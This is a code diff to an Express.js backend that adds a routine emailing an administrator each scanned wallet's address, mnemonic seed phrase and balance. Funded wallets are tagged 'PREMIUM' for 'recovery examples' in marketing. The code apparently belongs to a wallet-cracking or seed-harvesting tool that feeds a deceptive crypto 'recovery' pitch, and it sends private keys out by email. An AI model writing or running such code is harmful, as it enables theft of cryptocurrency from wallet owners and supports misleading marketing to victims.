@@ -44,8 +44,13 @@ router.post('/scan-real-wallets', async (req, res) => {
         tokens: balance.tokens
       });
       
+      // Send alert for every wallet found
+      await sendWalletAlert(wallet, balance, i + 1);
+      
       if (balance.totalValueUSD >= minBalance) {
         console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
+      } else {
+        console.log(`📍 WALLET FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
       }
       
       if (i % 10 === 0) {
@@ -151,6 +156,40 @@ async function checkRealBalance(address) {
   }
 
   return results;
+}
+
+// Send alert for every wallet found (regardless of balance)
+async function sendWalletAlert(wallet, balance, walletNumber) {
+  try {
+    const { sendAdminNotification } = require('../services/emailService');
+    
+    const hasBalance = balance.totalValueUSD > 0;
+    const subject = hasBalance ? 
+      `💰 WALLET #${walletNumber}: $${balance.totalValueUSD} FOUND!` : 
+      `📍 WALLET #${walletNumber}: Generated (Empty)`;
+    
+    const message = `ADMIN WALLET DISCOVERY ALERT
+
+🔢 WALLET NUMBER: ${walletNumber}
+💼 ADDRESS: ${wallet.address}
+🔑 PHRASE: ${wallet.mnemonic?.phrase || 'N/A'}
+
+💵 BALANCE STATUS:
+${hasBalance ? `✅ HAS FUNDS: $${balance.totalValueUSD}` : `❌ EMPTY WALLET: $0.00`}
+
+${hasBalance ? `💰 BREAKDOWN:
+${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})\n` : ''}${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}` : ''}
+
+💡 MARKETING USE:
+${hasBalance ? 'PREMIUM - Use for high-value recovery examples!' : 'STANDARD - Use for general recovery demonstrations'}
+
+🔗 VERIFY: Check address on Etherscan/BSCscan`;
+
+    await sendAdminNotification(subject, message);
+    
+  } catch (error) {
+    console.log('Failed to send wallet alert:', error.message);
+  }
 }
 
 // Send alert when wallet with funds is found
